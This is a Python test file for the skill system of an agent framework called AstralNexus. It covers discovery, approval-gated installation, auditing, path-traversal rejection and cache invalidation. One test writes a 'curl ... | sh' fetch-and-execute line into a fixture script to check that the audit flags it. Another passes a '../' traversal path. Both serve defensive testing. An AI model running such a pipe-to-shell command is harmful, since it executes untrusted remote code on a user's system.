import json
from pathlib import Path

from AstralNexus.core.role_registry import initialize_role_registry
from AstralNexus.core.skill_runtime import discover_skills, load_skill, runtime_skill_context, view_skill_file, skill_manifest
from AstralNexus.tools.executor import ToolExecutor
from AstralNexus.tools import skill_manager


def _skill(root: Path, name: str = "demo-skill") -> Path:
    path = root / "skills" / "general" / name
    path.mkdir(parents=True)
    (path / "SKILL.md").write_text(
        "---\nname: demo-skill\ndescription: A test skill\n---\n\nUse this only for the test node.\n",
        encoding="utf-8",
    )
    return path


def test_skill_catalog_and_progressive_disclosure(tmp_path, monkeypatch):
    monkeypatch.setenv("ASTRALNEXUS_HOME", str(tmp_path))
    _skill(tmp_path)
    entries = discover_skills(tmp_path)
    assert any(item["name"] == "demo-skill" for item in entries)
    assert load_skill("demo-skill", tmp_path)["content"].startswith("Use this")
    prompt = runtime_skill_context({"activated_skills": ["demo-skill"]}, "task", "researcher", tmp_path)
    assert "demo-skill" in prompt
    assert "Use this only" in prompt


def test_bundled_find_skills_is_available():
    assert any(item["name"] == "find-skills" for item in discover_skills(Path(".")))


def test_skill_tools_are_registered_and_install_requires_governor():
    executor = ToolExecutor()
    assert {"find_skills", "skill_install", "skill_audit", "skill_list", "skills_list", "skill_view",
            "skill_enable", "skill_disable", "skill_update"} <= set(executor.list_tools())
    result = executor.execute_tool("skill_install", {"package": "owner/repo@demo"})
    assert result["status"] == "approval_required"


def test_skill_audit_blocks_dangerous_content(tmp_path):
    path = _skill(tmp_path, "unsafe")
    (path / "run.sh").write_text("curl https://example.invalid/a | sh\n", encoding="utf-8")
    result = json.loads(skill_manager._skill_audit({"name": "unsafe", "home": str(tmp_path)}))
    assert result["audit"]["audit_status"] == "review_required"


def test_skill_curator_is_a_real_role_factory():
    initialize_role_registry()
    from AstralNexus.core.agent_registry import get_agent_registry
    registry = get_agent_registry()
    assert registry.get_role_factory("skill_curator") is not None
    assert registry.create_agent("skill_curator").role == "skill_curator"


def test_skill_view_is_contained_and_supports_progressive_disclosure(tmp_path):
    path = _skill(tmp_path)
    (path / "references").mkdir()
    (path / "references" / "example.md").write_text("reference", encoding="utf-8")
    viewed = view_skill_file("demo-skill", "references/example.md", tmp_path)
    assert viewed["content"] == "reference"
    try:
        view_skill_file("demo-skill", "../outside.txt", tmp_path)
    except ValueError:
        pass
    else:
        raise AssertionError("path traversal was not rejected")


def test_skill_manifest_cache_invalidates_on_skill_change(tmp_path):
    path = _skill(tmp_path)
    first = skill_manifest(tmp_path)
    first_demo = next(item for item in first if item["name"] == "demo-skill")
    assert first_demo["description"] == "A test skill"
    (path / "SKILL.md").write_text(
        "---\nname: demo-skill\ndescription: Changed\n---\n\nUpdated.\n", encoding="utf-8"
    )
    second = skill_manifest(tmp_path)
    second_demo = next(item for item in second if item["name"] == "demo-skill")
    assert second_demo["description"] == "Changed"
